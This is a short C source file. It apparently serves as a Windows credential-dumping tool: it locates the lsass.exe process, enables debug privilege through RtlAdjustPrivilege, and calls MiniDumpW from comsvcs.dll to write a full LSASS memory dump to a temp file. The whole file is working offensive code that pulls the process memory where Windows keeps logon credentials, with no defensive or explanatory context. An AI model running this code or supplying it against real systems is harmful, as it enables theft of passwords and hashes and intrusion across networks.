#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#include "process.h"

typedef HRESULT(WINAPI* _MiniDumpW)(
	DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);



int main(int argc, wchar_t* argv[]) {
	HRESULT             hr;
	_MiniDumpW          MiniDumpW;
	_RtlAdjustPrivilege RtlAdjustPrivilege;
	ULONG  t;
	wchar_t format_cmdline[] = L"%i C:\\temp\\lsass_from_exe.dmp full";
	wchar_t cmdline[256];
	DWORD pid;


	pid = FindProcessId(L"lsass.exe");


	swprintf(cmdline, sizeof(format_cmdline), format_cmdline, pid);


	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

	if (MiniDumpW == NULL) {
		printf("Unable to resolve COMSVCS!MiniDumpW.\n");
		return 0;
	}

	RtlAdjustPrivilege(20, TRUE, FALSE, &t);

	printf("Invoking COMSVCS!MiniDumpW(\"%ws\")\n", cmdline);


	MiniDumpW(0, 0, cmdline);
	printf("OK!\n");

	return 0;
}